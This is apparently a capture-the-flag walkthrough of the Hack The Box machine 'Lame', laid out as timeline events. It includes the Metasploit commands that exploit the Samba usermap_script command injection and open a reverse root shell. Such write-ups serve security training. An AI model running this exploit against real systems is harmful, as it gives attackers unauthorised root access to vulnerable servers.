title: HTB: Lame
description: Classic beginner-friendly Hack The Box machine. Samba usermap_script RCE leading to root.

events.title: Nmap full port scan
events.description: Full TCP port sweep with default scripts and version detection to enumerate the attack surface.
events.comments: FTP, SSH, Samba (139/445) and an old NFS mount all open.

events.title: Enumerate Samba shares
events.comments: tmp share is world-writable, version reported as Samba 3.0.20.

events.title: Search for known Samba exploit
events.description: Look for a public exploit matching the fingerprinted Samba version.

events.title: Launch usermap_script exploit
events.command:
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
run
events.description: Metasploit module exploiting the username map script command injection to get a shell.
events.comments: Lands as root immediately, no privesc chain needed.

events.title: Stabilize shell
events.description: Upgrade the raw reverse shell to a fully interactive TTY.

events.title: Read root flag
events.description: Confirm full compromise by reading the root flag.
